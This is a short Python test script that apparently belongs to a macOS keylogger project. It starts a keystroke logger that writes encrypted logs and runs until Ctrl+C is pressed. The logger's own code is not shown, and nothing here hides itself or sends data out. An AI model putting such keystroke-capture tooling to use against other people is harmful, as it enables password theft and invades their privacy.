from src.keylogger.mac_keylogger import MacKeyLogger
from src.writers.file_writer import FileWriter
from src.keylogger.manager import KeyLoggerManager
import time

def test_keylogger():
    print("Starting KeyLogger test...")
    print("Press some keys. Press Ctrl+C to stop.")
    
    try:
        # Initialize components
        keylogger = MacKeyLogger()
        writer = FileWriter(encryption_key="your_secret_key")
        manager = KeyLoggerManager(keylogger, writer)
        
        # Start logging
        manager.start()
        print("KeyLogger started successfully!")
        
        # Keep running until interrupted
        while True:
            time.sleep(1)
                
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        manager.stop()
        print("KeyLogger stopped.")
    except Exception as e:
        print(f"Error: {e}")
        
if __name__ == "__main__":
    test_keylogger()
